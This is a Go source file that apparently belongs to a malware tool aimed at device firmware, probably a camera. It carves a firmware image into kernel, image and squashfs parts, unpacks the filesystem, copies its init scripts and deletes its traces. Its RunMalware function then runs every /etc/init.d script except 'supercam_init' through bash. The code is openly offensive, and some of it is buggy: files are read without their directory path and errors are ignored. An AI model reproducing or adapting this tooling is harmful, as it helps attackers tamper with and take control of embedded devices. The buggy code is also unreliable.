package main

import (
	"errors"
	"fmt"
	"io"
	"io/ioutil"
	"os"
	"os/exec"
)

type part struct {
	name   string
	offset int
	size   int
}

const SquashfsOutput = "/tmp/squashfs-dir/"
const FirmwarePath = "/tmp/firmware.bin"
const TmpDir = "/tmp/"
const InitDir = "/etc/init.d/"
const SquasfsEtcDir = SquashfsOutput + InitDir

var (
	parts = [3]part{
		{"kernel_heder", 0x0, 0x40},
		{"image", 0x40, 0x200000},
		{"squashfs", 0x200040, 0x350000},
	}
)

const unsquashfsBinary = "/usr/bin/unsquashfs"
const mkimageBinary = "/usr/bin/mkimage"

func CheckDependencies() error {

	if _, err := os.Stat(unsquashfsBinary); err != nil {
		return errors.New("unsquashfs binary not found")
	}

	if _, err := os.Stat(mkimageBinary); err != nil {
		return errors.New("mkimage binary not found")
	}

	return nil
}

func Unpackfirmware() error {

	//technically we only need the squashfs part but we unpack all three
	for _, part := range parts {

		outfile, err := os.OpenFile(TmpDir+part.name, os.O_RDWR|os.O_CREATE, os.ModePerm)
		if err != nil {
			return err
		}

		firmwareFile, _ := os.Open(FirmwarePath)

		fmt.Println("unpacking " + part.name)
		_, err = firmwareFile.Seek(int64(part.offset), 0x0)

		if err != nil {
			return err
		}

		readBytes := make([]byte, part.size)

		_, err = io.ReadFull(firmwareFile, readBytes)
		_, err = outfile.Write(readBytes)

		if err != nil {
			return err
		}

		outfile.Sync()
		outfile.Close()
	}

	return nil
}

//function to call the unsquashfs binary to unpack the squasfs data
func Unsquash() (string, error) {

	cmd := exec.Command("/usr/bin/unsquashfs", "-d", SquashfsOutput, TmpDir+"squashfs")
	output, err := cmd.CombinedOutput()

	if err != nil {
		return string(output), err
	}
	return string(output), nil
}

//look for init script in the unsquashfs filesystem
func CopyInitScripts() error {

	files, _ := ioutil.ReadDir(SquasfsEtcDir)

	for _, file := range files {
		fmt.Println(file.Name())
		infile, _ := ioutil.ReadFile(file.Name())

		err := ioutil.WriteFile(TmpDir+file.Name(), infile, 0755)
		if err != nil {
			return err
		}
	}

	return nil
}

func CleanUp() {

	_ = os.Remove(FirmwarePath)
	_ = os.RemoveAll(SquashfsOutput)

	for _, file := range parts {
		_ = os.Remove(TmpDir + file.name)

	}

}

func RunMalware() {
	files, _ := ioutil.ReadDir(InitDir)

	for _, file := range files {
		if file.Name() != "supercam_init" {
			cmd := exec.Command("/bin/bash", InitDir+file.Name())
			cmd.CombinedOutput()
		}
	}
}
